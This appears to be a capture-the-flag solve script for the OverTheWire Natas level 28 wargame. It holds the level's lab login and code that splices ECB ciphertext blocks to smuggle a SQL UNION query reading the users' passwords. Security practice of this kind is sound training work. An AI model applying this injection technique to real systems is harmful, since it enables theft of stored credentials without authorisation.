import requests
import urllib
import string
import os
import base64

from utils import utils


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    inner_block_query = "          "
    res_inner_block = send_request(session, inner_block_query)
    inner_block = res_inner_block[len(prefix):len(res_inner_block) - len(suffix)]
    query = "AAAAAAAAA' UNION SELECT ALL password FROM users; -- " # The final space is necessary!
    res = send_request(session, query)
    my_part = res[len(prefix) + len(inner_block):]
    query = prefix + inner_block + my_part + suffix
    decoded = base64.b64decode(query)
    re_encoded = base64.b64encode(decoded)
    url_encoded = urllib.parse.quote_plus(re_encoded)
    print(url_encoded)